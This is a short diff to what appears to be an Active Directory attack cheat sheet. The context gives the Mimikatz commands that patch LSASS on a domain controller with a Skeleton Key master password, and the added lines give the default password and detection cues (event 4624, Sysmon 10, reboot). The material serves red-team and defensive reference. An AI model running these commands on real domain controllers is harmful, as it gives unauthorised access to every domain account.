@@ -23,3 +23,10 @@ Patch LSASS on the DC so a **master password** works for **any** account alongsi
 ```plaintext
 mimikatz # privilege::debug
 mimikatz # misc::skeleton
+# Any account can now authenticate with the skeleton password (default "mimikatz").
+```
+
+### Detection
+LSASS patch / `misc::skeleton` signatures; **4624** for any user with the master password; **Sysmon 10** on LSASS; reboot invalidates.
+
+---
